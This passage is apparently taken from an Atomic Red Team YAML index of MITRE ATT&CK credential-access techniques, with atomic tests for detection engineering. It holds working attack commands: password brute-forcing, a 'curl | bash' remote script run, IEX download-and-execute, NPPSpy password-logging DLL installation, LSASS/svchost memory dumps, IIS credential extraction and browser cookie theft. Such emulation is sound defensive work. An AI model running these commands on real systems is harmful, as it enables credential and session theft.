              Connect-AzureAD -Credential $Credential 2>&1> $null
              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
              Write-Host " [!] #{username}:${password} are valid credentials!`r`n"
              break
            } catch {
              Write-Host " [-] #{username}:${password} invalid credentials.`r`n"
            }
          }
          Write-Host "End of bruteforce"
    - name: Password Brute User using Kerbrute Tool
      auto_generated_guid: 59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4
      description: 'Bruteforce a single user''s password from a wordlist

        '
      supported_platforms:
      - windows
      input_arguments:
        domaincontroller:
          description: Domain controller where test will be run
          type: string
          default: "$ENV:userdnsdomain"
        domain:
          description: Domain where you will be testing
          type: string
          default: "$ENV:userdomain"
      dependency_executor_name: powershell
      dependencies:
      - description: 'kerbrute.exe must exist in $env:temp

          '
        prereq_command: 'if (test-path $env:temp\kerbrute.exe){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"
          -outfile "$env:temp\kerbrute.exe"

          '
      - description: 'bruteuser.txt must exist in $env:temp

          '
        prereq_command: 'if (test-path $env:temp\bruteuser.txt){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true"
          -outfile "$env:temp\bruteuser.txt"

          '
      executor:
        name: powershell
        elevation_required: false
        command: "cd $env:temp\n.\\kerbrute.exe bruteuser --dc #{domaincontroller}
          -d #{domain} $env:temp\\bruteuser.txt TestUser1 \n"
    - name: SUDO Brute Force - Debian
      auto_generated_guid: ba1bf0b6-f32b-4db0-b7cc-d78cacc76700
      description: "An adversary may find themselves on a box (e.g. via ssh key auth,
        with no password) with a user that has sudo'ers privileges, but they do not
        know the users password. Normally, failed attempts to access root will not
        cause the root account to become locked, to prevent denial-of-service. This
        functionality enables an attacker to undertake a local brute force password
        guessing attack without locking out the root user. \n\nThis test creates the
        \"art\" user with a password of \"password123\", logs in, downloads and executes
        the sudo_bruteforce.sh which brute force guesses the password, then deletes
        the user\n"
      supported_platforms:
      - linux
      input_arguments:
        remote_url:
          description: url of remote payload
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
      dependency_executor_name: bash
      dependencies:
      - description: 'Check if running on a Debian based machine.

          '
        prereq_command: |
          if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
          if grep -Rq "pam_tally" /etc/pam.d/*; then echo "pam_tally configured"; exit 1; fi
          if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
          if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
          if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
        get_prereq_command: 'apt update && apt install -y openssl sudo curl

          '
      executor:
        name: bash
        elevation_required: true
        command: |
          useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
          su art
          cd /tmp
          curl -s #{remote_url} |bash
        cleanup_command: 'userdel -fr art

          '
    - name: SUDO Brute Force - Redhat
      auto_generated_guid: 4097bc00-5eeb-4d56-aaf9-287d60351d95
      description: "An adversary may find themselves on a box (e.g. via ssh key auth,
        with no password) with a user that has sudo'ers privileges, but they do not
        know the users password. Normally, failed attempts to access root will not
        cause the root account to become locked, to prevent denial-of-service. This
        functionality enables an attacker to undertake a local brute force password
        guessing attack without locking out the root user. \n\nThis test creates the
        \"art\" user with a password of \"password123\", logs in, downloads and executes
        the sudo_bruteforce.sh which brute force guesses the password, then deletes
        the user\n"
      supported_platforms:
      - linux
      input_arguments:
        remote_url:
          description: url of remote payload
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
      dependency_executor_name: bash
      dependencies:
      - description: 'Check if running on a Redhat based machine.

          '
        prereq_command: |
          if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then echo "RedHat"; else echo "NOT RedHat"; exit 1; fi
          if grep -Rq "pam_faillock" /etc/pam.d/*; then echo "pam_faillock configured"; exit 1; fi
          if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
          if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
          if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
        get_prereq_command: 'yum update && yum install -y openssl sudo curl

          '
      executor:
        name: bash
        elevation_required: true
        command: |
          useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
          su art
          cd /tmp
          curl -s #{remote_url} |bash
        cleanup_command: 'userdel -fr art

          '
  T1003:
    technique:
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Vincent Le Toux
      - Ed Williams, Trustwave, SpiderLabs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22
      type: attack-pattern
      created: '2017-05-31T21:30:19.735Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1003
        url: https://attack.mitre.org/techniques/T1003
      - description: French, D. (2018, October 2). Detecting Attempts to Steal Passwords
          from Memory. Retrieved October 11, 2019.
        url: https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea
        source_name: Medium Detecting Attempts to Steal Passwords from Memory
      - url: https://github.com/mattifestation/PowerSploit
        description: PowerSploit. (n.d.). Retrieved December 4, 2014.
        source_name: Powersploit
      - url: https://msdn.microsoft.com/library/cc228086.aspx
        description: Microsoft. (2017, December 1). MS-DRSR Directory Replication
          Service (DRS) Remote Protocol. Retrieved December 4, 2017.
        source_name: Microsoft DRSR Dec 2017
      - url: https://msdn.microsoft.com/library/dd207691.aspx
        description: Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December
          4, 2017.
        source_name: Microsoft GetNCCChanges
      - url: https://wiki.samba.org/index.php/DRSUAPI
        description: SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.
        source_name: Samba DRSUAPI
      - url: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/
        description: Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids,
          Oh My. Retrieved December 4, 2017.
        source_name: Harmj0y DCSync Sept 2015
      - url: https://msdn.microsoft.com/library/cc237008.aspx
        description: Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol.
          Retrieved December 6, 2017.
        source_name: Microsoft NRPC Dec 2017
      - url: https://msdn.microsoft.com/library/cc245496.aspx
        description: Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote
          Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.
        source_name: Microsoft SAMR
      - url: https://adsecurity.org/?p=1729
        description: Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation,
          and Detection. Retrieved December 4, 2017.
        source_name: AdSecurity DCSync Sept 2015
      modified: '2022-03-08T21:00:53.436Z'
      name: OS Credential Dumping
      description: |
        Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.

        Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: "### Windows\nMonitor for unexpected processes interacting
        with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from
        Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002)
        access the LSA Subsystem Service (LSASS) process by opening the process, locating
        the LSA secrets key, and decrypting the sections in memory where credential
        details are stored. Credential dumpers may also use methods for reflective
        [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential
        indicators of malicious activity.\n\nHash dumpers open the Security Accounts
        Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM)
        or create a dump of the Registry SAM key to access stored account password
        hashes. Some hash dumpers will open the local file system as a device and
        parse to the SAM table to avoid file access defenses. Others will make an
        in-memory copy of the SAM table before reading hashes. Detection of compromised
        [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries
        may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows
        Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor
        processes and command-line arguments for program execution that may be indicative
        of credential dumping. Remote access tools may contain built-in features or
        incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002).
        [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts also exist
        that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz
        module, (Citation: Powersploit) which may require additional logging features
        to be configured in the operating system to collect necessary information
        for analysis.\n\nMonitor domain controller logs for replication requests and
        other unscheduled activity possibly associated with DCSync. (Citation: Microsoft
        DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI)
        Note: Domain controllers may not log replication requests originating from
        the default domain controller account. (Citation: Harmj0y DCSync Sept 2015).
        Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation:
        Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft
        SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity
        DCSync Sept 2015)\n\n### Linux\nTo obtain the passwords and hashes stored
        in memory, processes must open a maps file in the /proc filesystem for the
        process being analyzed. This file is stored under the path <code>/proc/<pid>/maps</code>,
        where the <code><pid></code> directory is the unique pid of the program being
        interrogated for such authentication data. The AuditD monitoring tool, which
        ships stock in many Linux distributions, can be used to watch for hostile
        processes opening this file in the proc file system, alerting on the pid,
        process name, and arguments of such programs."
      x_mitre_version: '2.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Access'
      - 'Process: OS API Execution'
      - 'Active Directory: Active Directory Object Access'
      - 'Process: Process Access'
      - 'Network Traffic: Network Traffic Flow'
      - 'Command: Command Execution'
      - 'File: File Access'
      - 'Process: Process Creation'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      - root
      x_mitre_is_subtechnique: false
      identifier: T1003
    atomic_tests:
    - name: Gsecdump
      auto_generated_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
      description: "Dump credentials from memory using Gsecdump.\n\nUpon successful
        execution, you should see domain\\username's followed by two 32 character
        hashes.\n\nIf you see output that says \"compat: error: failed to create child
        process\", execution was likely blocked by Anti-Virus. \nYou will receive
        only error output if you do not run this test from an elevated context (run
        as administrator)\n\nIf you see a message saying \"The system cannot find
        the path specified\", try using the get-prereq_commands to download and install
        Gsecdump first.\n"
      supported_platforms:
      - windows
      input_arguments:
        gsecdump_exe:
          description: Path to the Gsecdump executable
          type: path
          default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
        gsecdump_bin_hash:
          description: File hash of the Gsecdump binary file
          type: string
          default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
        gsecdump_url:
          description: Path to download Gsecdump binary file
          type: url
          default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'Gsecdump must exist on disk at specified location (#{gsecdump_exe})

          '
        prereq_command: 'if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
          if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
            Move-Item $binpath "#{gsecdump_exe}"
          }
      executor:
        command: "#{gsecdump_exe} -a\n"
        name: command_prompt
        elevation_required: true
    - name: Credential Dumping with NPPSpy
      auto_generated_guid: 9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6
      description: |-
        Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
        After user's logging in cleartext password is saved in C:\NPPSpy.txt.
        Clean up deletes the files and reverses Registry changes.
        NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: NPPSpy.dll must be available in local temp directory
        prereq_command: if (Test-Path "$env:Temp\NPPSPY.dll") {exit 0} else {exit
          1}
        get_prereq_command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "$env:Temp\NPPSPY.dll"
      executor:
        command: |-
          Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
          $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
          $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
          Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
          $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
          $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
          echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
        cleanup_command: "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\"
          -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue
          = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath
          -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\"
          -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item
          C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"
        name: powershell
        elevation_required: true
    - name: Dump svchost.exe to gather RDP credentials
      auto_generated_guid: d400090a-d8ca-4be0-982e-c70598a23de9
      description: |
        The svchost.exe contains the RDP plain-text credentials.
        Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/

        Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.
      supported_platforms:
      - windows
      executor:
        command: |
          $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
          if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
          C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
        cleanup_command: 'Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore

          '
        name: powershell
        elevation_required: true
    - name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using
        list)
      auto_generated_guid: 6c7a4fd3-5b0b-4b30-a93e-39411b25d889
      description: |-
        AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
        [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: IIS must be installed prior to running the test
        prereq_command: if ((Get-WindowsFeature Web-Server).InstallState -eq "Installed")
          {exit 0} else {exit 1}
        get_prereq_command: Install-WindowsFeature -name Web-Server -IncludeManagementTools
      executor:
        command: |-
          C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
          C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
          C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
        name: powershell
        elevation_required: true
    - name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using
        config)
      auto_generated_guid: 42510244-5019-48fa-a0e5-66c3b76e6049
      description: |-
        AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
        [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: IIS must be installed prior to running the test
        prereq_command: if ((Get-WindowsFeature Web-Server).InstallState -eq "Installed")
          {exit 0} else {exit 1}
        get_prereq_command: Install-WindowsFeature -name Web-Server -IncludeManagementTools
      executor:
        command: C:\Windows\System32\inetsrv\appcmd.exe list apppool /config
        name: powershell
        elevation_required: true
    - name: Dump Credential Manager using keymgr.dll and rundll32.exe
      auto_generated_guid: 84113186-ed3c-4d0d-8a3c-8980c86c1f4a
      description: |-
        This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).
        Reference: https://twitter.com/0gtweet/status/1415671356239216653
      supported_platforms:
      - windows
      executor:
        command: rundll32.exe keymgr,KRShowKeyMgr
        name: powershell
  T1171:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Eric Kuehn, Secure Ideas
      - Matthew Demaske, Adaptforward
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1171
        url: https://attack.mitre.org/techniques/T1171
      - url: https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution
        description: Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution.
          Retrieved November 17, 2017.
        source_name: Wikipedia LLMNR
      - url: https://technet.microsoft.com/library/cc958811.aspx
        description: Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November
          17, 2017.
        source_name: TechNet NetBIOS
      - source_name: byt3bl33d3r NTLM Relaying
        url: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
        description: Salvati, M. (2017, June 2). Practical guide to NTLM Relaying
          in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February
          7, 2019.
      - source_name: Secure Ideas SMB Relay
        url: https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html
        description: Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays
          Should Be On Your Mind. Retrieved February 7, 2019.
      - url: https://github.com/nomex/nbnspoof
        description: Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.
        source_name: GitHub NBNSpoof
      - url: https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response
        description: Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.
        source_name: Rapid7 LLMNR Spoofer
      - url: https://github.com/SpiderLabs/Responder
        description: Gaffie, L. (2016, August 25). Responder. Retrieved November 17,
          2017.
        source_name: GitHub Responder
      - url: https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning
        description: 'Sternstein, J. (2013, November). Local Network Attacks: LLMNR
          and NBT-NS Poisoning. Retrieved November 17, 2017.'
        source_name: Sternsecurity LLMNR-NBTNS
      - url: https://github.com/Kevin-Robertson/Conveigh
        description: Robertson, K. (2016, August 28). Conveigh. Retrieved November
          17, 2017.
        source_name: GitHub Conveigh
      modified: '2020-02-11T19:09:48.452Z'
      name: LLMNR/NBT-NS Poisoning and Relay
      description: |-
        Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)

        Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)

        Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor <code>HKLM\Software\Policies\Microsoft\Windows NT\DNSClient</code> for changes to the "EnableMulticast" DWORD value. A value of ‚Äú0‚Ä? indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)

        Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.

        Deploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1539:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Office 365
      - SaaS
      - Google Workspace
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Microsoft Threat Intelligence Center (MSTIC)
      - Johann Rehberger
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff
      type: attack-pattern
      created: '2019-10-08T20:04:35.508Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1539
        url: https://attack.mitre.org/techniques/T1539
      - description: Rehberger, J. (2018, December). Pivot to the Cloud using Pass
          the Cookie. Retrieved April 5, 2019.
        url: https://wunderwuzzi23.github.io/blog/passthecookie.html
        source_name: Pass The Cookie
      - source_name: Kaspersky TajMahal April 2019
        url: https://securelist.com/project-tajmahal/90240/
        description: GReAT. (2019, April 10). Project TajMahal ‚Äì a sophisticated new
          APT framework. Retrieved October 14, 2019.
      - source_name: Unit 42 Mac Crypto Cookies January 2019
        url: https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/
        description: Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware
          Steals Cryptocurrency Exchanges‚Äô Cookies. Retrieved October 14, 2019.
      - description: Gretzky, Kuba. (2019, April 10). Retrieved October 8, 2019.
        url: https://github.com/kgretzky/evilginx2
        source_name: Github evilginx2
      - source_name: GitHub Mauraena
        url: https://github.com/muraenateam/muraena
        description: Orr√π, M., Trotta, G.. (2019, September 11). Muraena. Retrieved
          October 14, 2019.
      modified: '2021-07-28T01:26:51.971Z'
      name: Steal Web Session Cookie
      description: |-
        An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

        Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

        There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

        After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitor for attempts to access files and repositories on
        a local system that are used to store browser session cookies. Monitor for
        attempts by programs to inject into or dump browser process memory.
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Access'
      - 'File: File Access'
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
      identifier: T1539
    atomic_tests:
    - name: Steal Firefox Cookies (Windows)
      auto_generated_guid: 4b437357-f4e9-4c84-9fa6-9bcee6f826aa
      description: "This test queries Firefox's cookies.sqlite database to steal the
        cookie data contained within it, similar to Zloader/Zbot's cookie theft function.
        \nNote: If Firefox is running, the process will be killed to ensure that the
        DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.
        \n"
      supported_platforms:
      - windows
      input_arguments:
        sqlite3_path:
          description: Path to sqlite3
          type: path
          default: "$env:temp\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
        output_file:
          description: Filepath to output cookies
          type: path
          default: "$env:temp\\T1539FirefoxCookies.txt"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Sqlite3 must exist at (#{sqlite3_path})

          '
        prereq_command: 'if (Test-Path #{sqlite3_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "$env:temp\sqlite.zip"
          Expand-Archive -path "$env:temp\sqlite.zip" -destinationpath "$env:temp\" -force
      executor:
        command: |
          stop-process -name "firefox" -force -erroraction silentlycontinue
          $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
          "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"
        cleanup_command: 'remove-item #{output_file} -erroraction silentlycontinue

          '
        name: powershell
        elevation_required: false
    - name: Steal Chrome Cookies (Windows)
      auto_generated_guid: 26a6b840-4943-4965-8df5-ef1f9a282440
      description: "This test queries Chrome's SQLite database to steal the encrypted
        cookie data, designed to function similarly to Zloader/Zbot's cookie theft
        function. \nOnce an adversary obtains the encrypted cookie info, they could
        go on to decrypt the encrypted value, potentially allowing for session theft.
        \nNote: If Chrome is running, the process will be killed to ensure that the
        DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.
        \n"
      supported_platforms:
      - windows
      input_arguments:
        cookie_db:
          description: Filepath for Chrome cookies database
          type: string
          default: "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
        sqlite3_path:
          description: Path to sqlite3
          type: path
          default: "$env:temp\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
        output_file:
          description: Filepath to output cookies
          type: path
          default: "$env:temp\\T1539ChromeCookies.txt"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Sqlite3 must exist at (#{sqlite3_path})

          '
        prereq_command: 'if (Test-Path #{sqlite3_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
